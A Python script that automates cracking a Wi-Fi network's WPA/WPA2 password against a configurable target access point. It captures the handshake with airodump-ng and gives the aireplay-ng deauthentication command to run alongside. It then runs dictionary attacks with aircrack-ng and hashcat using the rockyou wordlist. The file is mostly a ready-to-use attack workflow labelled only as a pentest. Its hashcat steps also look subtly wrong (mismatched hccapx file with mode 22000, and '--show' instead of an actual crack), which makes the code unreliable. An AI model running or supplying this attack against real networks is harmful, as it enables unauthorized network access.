import subprocess
import os
import time

# --- Configuration ---
INTERFACE = "wlan0mon"  # Your wireless interface in monitor mode
TARGET_BSSID = "AA:BB:CC:DD:EE:FF"  # The MAC address of the target AP
TARGET_CHANNEL = "6"  # The channel the target AP is on
HANDSHAKE_FILE = "capture_handshake"
WORDLIST_PATH = "/usr/share/wordlists/rockyou.txt" # Common path for testing wordlists
# ---------------------

def run_command(command):
    """Executes a shell command and prints the output."""
    try:
        print(f"\n[+] Executing: {' '.join(command)}")
        # Use shell=False for security and portability, passing command as a list
        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
        # Stream the output live
        for line in process.stdout:
            print(line, end='')
        
        process.wait()
        if process.returncode != 0:
            print(f"\n[!] Command returned non-zero exit code: {process.returncode}")
        return process.returncode
    except FileNotFoundError:
        print(f"\n[!] Error: Tool not found. Make sure {command[0]} is installed and in your PATH.")
        return 1

# 1. Capture the Handshake (Run airodump-ng and stop after a few seconds or when the user interrupts)
print("--- Step 1: Capturing WPA Handshake ---")
print(f"Running airodump-ng on channel {TARGET_CHANNEL}. You need to run a deauth attack in a second window.")

# airodump-ng command: BSSID filter, channel, output file base name
# Note: In a real script, this would run in the background while aireplay-ng runs.
# For this example, we'll run it for a short time. You'd use a separate process for deauth.
capture_cmd = ["timeout", "30", "airodump-ng", "--bssid", TARGET_BSSID, "--channel", TARGET_CHANNEL, "--write", HANDSHAKE_FILE, INTERFACE]

# You would typically run the deauth command (aireplay-ng -0 5 -a [AP_BSSID] [INTERFACE]) 
# in another terminal simultaneously, or manage it with a separate subprocess.
run_command(capture_cmd) 

# Check if the handshake file was created (usually .cap)
cap_file = f"{HANDSHAKE_FILE}-01.cap"
if not os.path.exists(cap_file):
    print(f"\n[!] Handshake capture file not found: {cap_file}. Ensure you captured the four-way handshake.")
else:
    print(f"\n[+] Handshake file created: {cap_file}")

    # 2. Crack the Password using aircrack-ng
    print("\n--- Step 2: Cracking Password with Aircrack-ng (Dictionary Attack) ---")
    
    aircrack_cmd = ["aircrack-ng", "-w", WORDLIST_PATH, cap_file]
    run_command(aircrack_cmd)

    print("\nAttempting to crack with Hashcat for better performance (requires a compatible GPU):")
    
    # 3. Convert .cap to Hashcat format (requires a tool like 'aircrack-ng' or 'hashcat-utils')
    # Using aircrack-ng utility for conversion (often bundled in Kali/Pentest distros)
    hc_conversion_cmd = ["aircrack-ng", cap_file, "-j", "hashcat_output"]
    run_command(hc_conversion_cmd)
    
    # 4. Crack the Password using hashcat
    # 22000 is the mode for WPA-EAPOL-PBKDF2 (WPA/WPA2-PSK)
    hashcat_cmd = ["hashcat", "-m", "22000", "hashcat_output.hccapx", WORDLIST_PATH, "--show"]
    # You would typically redirect all output to a log file for later review
    run_command(hashcat_cmd)
    
print("\n--- Wireless Pentest Workflow Complete ---")
